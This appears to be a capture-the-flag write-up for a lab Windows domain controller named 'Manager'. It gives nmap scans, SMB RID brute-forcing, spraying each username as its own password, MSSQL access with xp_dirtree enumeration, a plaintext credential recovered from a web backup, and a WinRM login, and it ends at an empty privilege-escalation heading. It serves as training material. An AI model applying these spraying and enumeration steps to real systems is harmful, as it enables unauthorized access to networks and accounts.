![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/fde8cd9d-8c69-4862-8961-381a29b7b13b)

## First we run nmap full port scan to know whhat ports are open in the target 
`nmap -p- --min-rate 1000 -oN full.nmap -v -Pn <IP>`

```shell
# Nmap 7.94SVN scan initiated Thu Feb 22 17:04:11 2024 as: nmap -p- --min-rate 1000 -oN full.nmap -v -Pn 10.129.43.129
Nmap scan report for 10.129.43.129
Host is up (0.15s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49693/tcp open  unknown
49694/tcp open  unknown
49695/tcp open  unknown
49730/tcp open  unknown
50211/tcp open  unknown
61672/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Feb 22 17:07:29 2024 -- 1 IP address (1 host up) scanned in 197.15 seconds
```
now we know what ports are open, let's run default nmap scripts to know what services are running on these ports.

## nmap service scan 

```shell
# Nmap 7.94SVN scan initiated Thu Feb 22 17:13:02 2024 as: nmap -sC -sV -T4 -oN service.nmap -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49693,50211,61672 -Pn 10.129.43.129
Nmap scan report for 10.129.43.129
Host is up (0.27s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Manager
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-22 23:16:42Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-22T23:18:13+00:00; +7h03m30s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-02-22T23:18:13+00:00; +7h03m31s from scanner time.
1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-02-22T22:01:43
|_Not valid after:  2054-02-22T22:01:43
| ms-sql-info: 
|   10.129.43.129:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-02-22T23:18:13+00:00; +7h03m31s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.43.129:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-02-22T23:18:13+00:00; +7h03m30s from scanner time.
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-02-22T23:18:13+00:00; +7h03m31s from scanner time.
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49667/tcp open     msrpc         Microsoft Windows RPC
49693/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
50211/tcp filtered unknown
61672/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-22T23:17:36
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h03m30s, deviation: 0s, median: 7h03m30s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 22 17:14:44 2024 -- 1 IP address (1 host up) scanned in 102.72 seconds
```
now we know what services are open on the target 


## Enumerating SMB
```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Manager]
└─$ smbclient -L //manager.htb/ -N          

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to manager.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
checking for shares available anonymously on smb server, got nothing. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/819c307b-fca2-4107-9213-daba2b372fa7)

```shell
sudo nxc smb 10.129.22.154 -u anonymous -p '' --rid-brute
```

using nexec to bruteforce rid of users, we got some users in the domain. 

```
zhong 
cheng 
ryan 
raven 
jinWoo 
chinHae 
operator 
```
we made a userlist with the usernames. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5f9f241f-8cb6-4f2a-9cc7-a4b397d4dbe2)

```shell
sudo nxc smb 10.129.22.154 -u users.txt -p users.txt
```
bruteforcing smb using the users gotten with the same users as password to see if we got a weak cred. we can see we have smb access as user `operator:operator`.

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Manager]
└─$ sudo nxc smb 10.129.22.154 -u operator -p operator --shares 
SMB         10.129.22.154   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.22.154   445    DC01             [+] manager.htb\operator:operator 
SMB         10.129.22.154   445    DC01             [*] Enumerated shares
SMB         10.129.22.154   445    DC01             Share           Permissions     Remark
SMB         10.129.22.154   445    DC01             -----           -----------     ------
SMB         10.129.22.154   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.22.154   445    DC01             C$                              Default share
SMB         10.129.22.154   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.22.154   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.22.154   445    DC01             SYSVOL          READ            Logon server share
```
enumerating smb using the creds we got, we can see we have read access to shares `NETVOL` & `SYSVOL`. let's check em out.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/8c5754b5-1b5f-4143-b5db-8dfd93e5c059)

checking the `NETLOGON` share was empty, we got a dir in the `SYSVOL` share. proceded to download everything in it. checked everything in the smb, got nothing useful


## Enumerating mssql 

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Manager]
└─$ sudo nxc mssql 10.129.22.154 -u operator -p operator 
MSSQL       10.129.22.154   1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
MSSQL       10.129.22.154   1433   DC01             [+] manager.htb\operator:operator   
```
using netexec to check for access on mssql server, we can see we have access to the mssql service. let's login mssql 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/149d185f-b6c7-4978-ab5c-f2509fb613e1)

```shell
impacket-mssqlclient manager.htb/operator:operator@10.129.22.154 -windows-auth
```

using impacket script `impacket-mssqlclient` to login as user operator to the mssql server. let's find a way to get shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c19f3e82-63c6-4cbe-baf2-e68eae6d3ca1)

```mssql
exec master.dbo.xp_dirtree 'C:\', 1, 1;
exec master.dbo.xp_dirtree 'C:\inetpub\', 1, 1;
exec master.dbo.xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
```

enumerating the xp_cmdshell, we don't have enough privilege to use the xp_cmdshell command. so we use `xp_dirtree` to list directories, found a web backup  `website-backup-27-07-23-old.zip` file in the root path of the web app. read about exploiting mssql [exploit](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Manager]
└─$ wget http://manager.htb/website-backup-27-07-23-old.zip            
--2024-02-21 16:56:53--  http://manager.htb/website-backup-27-07-23-old.zip
Resolving manager.htb (manager.htb)... 10.129.22.154
Connecting to manager.htb (manager.htb)|10.129.22.154|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1045328 (1021K) [application/x-zip-compressed]
Saving to: ‘website-backup-27-07-23-old.zip’

website-backup-27-07-23-old.zip        100%[============================================================================>]   1021K  90.2KB/s    in 30s     

2024-02-21 16:57:23 (34.1 KB/s) - ‘website-backup-27-07-23-old.zip’ saved [1045328/1045328]
```
download the backup file into our host.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/4da4621e-f0b8-4655-af22-f4fed92d76c6)

extract the content of the zip file. 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Manager/backup]
└─$ cat .old-conf.xml 
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```
found a file `.old-conf.xml` which contain a credential. 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Manager]
└─$ sudo nxc winrm manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'     
SMB         10.129.22.154   445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
WINRM       10.129.22.154   5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
```
using nxc to check if we can login winrm, it was success, now let's login winrm using the creds 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/14d15a6e-cc79-430e-bc96-2b3e4acfc25a)

login winrm using the creds.


## Privilege Escalation 


